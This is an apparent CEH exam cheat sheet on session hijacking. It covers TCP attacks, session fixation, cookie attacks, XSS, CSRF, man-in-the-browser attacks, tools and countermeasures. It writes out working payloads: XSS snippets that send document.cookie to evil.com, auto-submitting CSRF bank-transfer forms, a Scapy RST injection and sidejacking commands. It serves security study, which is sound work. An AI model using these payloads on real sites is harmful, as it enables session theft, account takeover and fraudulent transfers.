> For authorized security testing, red team exercises, and educational study only.

# Session Hijacking (CEH v13 — Module 11)

Taking over an active session by stealing or predicting session tokens, exploiting weak transport security, or injecting forged requests to impersonate an authenticated user.

---

## Session Hijacking Concepts

| Dimension | Type | Description |
|-----------|------|-------------|
| Activity | **Active** | Attacker takes over session, sends traffic as victim |
| Activity | **Passive** | Attacker sniffs/monitors session without injecting |
| Layer | **Network-level** | Targets TCP/IP layer (sequence numbers, RST injection) |
| Layer | **Application-level** | Targets HTTP sessions (cookies, tokens, URLs) |

**Spoofing vs Hijacking:** Spoofing initiates a new session with forged identity; hijacking takes over an existing authenticated session.

---

## TCP Session Hijacking

### Sequence Number Prediction

```text
Attacker goal: predict the next ISN (Initial Sequence Number)
to inject packets the server will accept.

TCP three-way handshake:
  Client → SYN (SEQ=x)           → Server
  Client ← SYN-ACK (SEQ=y, ACK=x+1) ← Server
  Client → ACK (SEQ=x+1, ACK=y+1)    → Server

If ISN is predictable → attacker forges packets with valid SEQ/ACK.
```

### TCP RST Injection

```bash
# Using hping3 to send RST to tear down a connection
hping3 -R -s <src_port> -p <dst_port> -a <spoofed_src_ip> <target_ip>

# Scapy RST injection
from scapy.all import *
pkt = IP(src="<victim>", dst="<server>") / TCP(sport=<sp>, dport=<dp>, flags="R", seq=<predicted_seq>)
send(pkt)
```

### Mitnick Attack (1994)

```text
1. Flood trusted host with SYN (DoS to silence it)
2. Send SYN to target spoofing trusted host's IP
3. Predict server's ISN from SYN-ACK (never seen — blind)
4. Send ACK with predicted sequence number
5. Inject commands (e.g., rsh trust modification)
```

---

## Application-Level Hijacking

### Session Token Theft

```bash
# Session ID in URL (session exposure via Referer header, logs, browser history)
https://example.com/dashboard?sessionid=abc123

# Session ID in cookie
Cookie: PHPSESSID=abc123; JSESSIONID=xyz789
```

### Session Fixation

```text
1. Attacker obtains a valid session ID from the server
2. Attacker forces victim to use that session ID
   - Via URL: https://target.com/login?SID=attacker_known_id
   - Via Set-Cookie in injected response
   - Via <meta> tag or JavaScript
3. Victim authenticates → server elevates the SAME session
4. Attacker uses the known session ID as authenticated user
```

### Session Donation

```text
Attacker logs into their own account, then forces the victim's
browser to use the attacker's session cookie. Victim performs
actions (enters credit card, PII) in the attacker's account.
Attacker retrieves the data later.
```

---

## Cookie Attacks

### Cookie Stealing via XSS

```javascript
// Classic cookie exfiltration
<script>
new Image().src = "https://evil.com/steal?c=" + document.cookie;
</script>

// Fetch-based exfiltration
<script>
fetch("https://evil.com/log", {
  method: "POST",
  body: document.cookie
});
</script>
```

### Cookie Replay

```bash
# Capture a valid session cookie, replay it from attacker's browser
curl -b "SESSIONID=stolen_value" https://target.com/account
```

### Cookie Poisoning

```text
Modify cookie values to escalate privileges or alter application state:
  Cookie: role=user    →  Cookie: role=admin
  Cookie: price=99.99  →  Cookie: price=0.01
```

### Session Sidejacking (Firesheep-style)

```bash
# Sniff unencrypted cookies on shared WiFi
# Ferret: captures cookies from network traffic
ferret -i eth0

# Hamster: sets up a proxy to inject captured cookies
hamster

# Then browse to http://hamster:1234 and hijack listed sessions
```

---

## Cross-Site Scripting (XSS) for Session Theft

### Reflected XSS

```text
Payload in URL parameter, reflected in response:
https://target.com/search?q=<script>document.location='https://evil.com/?c='+document.cookie</script>
```

### Stored XSS

```text
Payload stored on server (comments, profiles, messages):
Attacker posts: <script>fetch('https://evil.com/'+document.cookie)</script>
Every user viewing the page sends their cookies to the attacker.
```

### DOM-Based XSS

```javascript
// Vulnerable code reads from location.hash without sanitization
var name = document.location.hash.substr(1);
document.getElementById("greeting").innerHTML = "Hello " + name;

// Exploit: https://target.com/page#<img src=x onerror=alert(document.cookie)>
```

---

## Cross-Site Request Forgery (CSRF)

```html
<!-- Auto-submitting form (POST-based CSRF) -->
<form action="https://bank.com/transfer" method="POST" id="csrfForm">
  <input type="hidden" name="to" value="attacker_account" />
  <input type="hidden" name="amount" value="10000" />
</form>
<script>document.getElementById("csrfForm").submit();</script>

<!-- Image tag (GET-based CSRF) -->
<img src="https://bank.com/transfer?to=attacker&amount=10000" />
```

**CSRF tokens** — server-generated unique per-request tokens embedded in forms and validated server-side.

---

## Man-in-the-Browser (MitB)

```text
Attack flow:
1. Victim installs malware (Trojan, malicious extension)
2. Malware hooks browser API / injects into browser process
3. Intercepts and modifies transactions in real time
   - Changes transfer recipient/amount after user confirms
   - Displays original values to victim (visual spoofing)
4. Captures credentials, OTPs, and session tokens

Notable MitB malware: Zeus, SpyEye, Carberp, Emotet
```

---

## Session Token Weaknesses

```text
Weak patterns attackers look for:
- Sequential IDs:      sess_0001, sess_0002, sess_0003
- Timestamp-based:     base64(unix_timestamp + user_id)
- Predictable PRNG:    Math.random() or linear congruential generators
- Short tokens:        < 64 bits of entropy → brute-forceable
- No server binding:   token works from any IP/user-agent

Analysis approach:
1. Collect 500+ tokens
2. Check for sequential patterns, common prefixes
3. Measure entropy (NIST SP 800-90B tests)
4. Test birthday collision probability
```

---

## Tools

| Tool | Use Case |
|------|----------|
| **Burp Suite** | Session handling rules, token analysis (Sequencer), cookie manipulation |
| **OWASP ZAP** | Automated session management testing, forced browsing |
| **Hamster/Ferret** | WiFi session sidejacking (capture + replay cookies) |
| **Ettercap** | ARP poisoning + MITM for sniffing sessions on LAN |
| **Wireshark** | Packet capture, filter `http.cookie` or `tcp.stream` |
| **BeEF** | Browser exploitation framework, hook + steal sessions via XSS |

### Burp Suite — Session Token Analysis

```text
Burp Sequencer:
1. Capture token-issuing response
2. Send to Sequencer → Start live capture
3. Collect 5,000–10,000 tokens
4. Analyze: character-level and bit-level entropy
5. Overall quality rating: excellent / reasonable / poor
```

---

## Countermeasures

| Defense | Implementation |
|---------|---------------|
| **HttpOnly** | `Set-Cookie: SID=abc; HttpOnly` — blocks JavaScript access |
| **Secure flag** | `Set-Cookie: SID=abc; Secure` — cookie sent only over HTTPS |
| **SameSite** | `Set-Cookie: SID=abc; SameSite=Strict` — prevents CSRF |
| **Session timeout** | Idle timeout (15–30 min) + absolute timeout (4–8 hrs) |
| **Token rotation** | Issue new session ID after login and privilege changes |
| **CSRF tokens** | Unique per-request tokens validated server-side |
| **HSTS** | `Strict-Transport-Security: max-age=31536000; includeSubDomains` |
| **Certificate pinning** | Pin server cert/public key in mobile apps to prevent MITM |
| **Regenerate on auth** | `session_regenerate_id(true)` after login (PHP) |
| **IP/UA binding** | Tie session to client IP + User-Agent (breaks on NAT/mobile) |

---

## Tips

- Session fixation is testable by getting a session ID pre-login, authenticating, and checking if the same ID is still valid post-login.
- Always check if the application regenerates the session token after authentication — if not, it is vulnerable to fixation.
- Burp Sequencer is the go-to tool for quantifying session token randomness on the CEH exam.
- CSRF and XSS are often paired: XSS can bypass CSRF token protections by reading them from the DOM.
- SameSite=Lax is now the default in modern browsers, which mitigates many CSRF scenarios but not all (top-level GET navigations still send cookies).
- On the exam, remember: HttpOnly prevents XSS cookie theft, Secure prevents sidejacking, SameSite prevents CSRF.

---

## See Also

- `sheets/offensive/xss-attacks.md`
- `sheets/offensive/csrf-attacks.md`
- `sheets/offensive/network-sniffing.md`
- `sheets/defensive/web-app-hardening.md`

---

## References

- CEH v13 Official Courseware — Module 11: Session Hijacking
- OWASP Session Management Cheat Sheet — https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html
- OWASP Testing Guide — Session Management Testing — https://owasp.org/www-project-web-security-testing-guide/
- RFC 6265 — HTTP State Management Mechanism (Cookies)
- Mitnick Attack (1994) — Tsutomu Shimomura's account
- NIST SP 800-63B — Digital Identity Guidelines (Session Management)
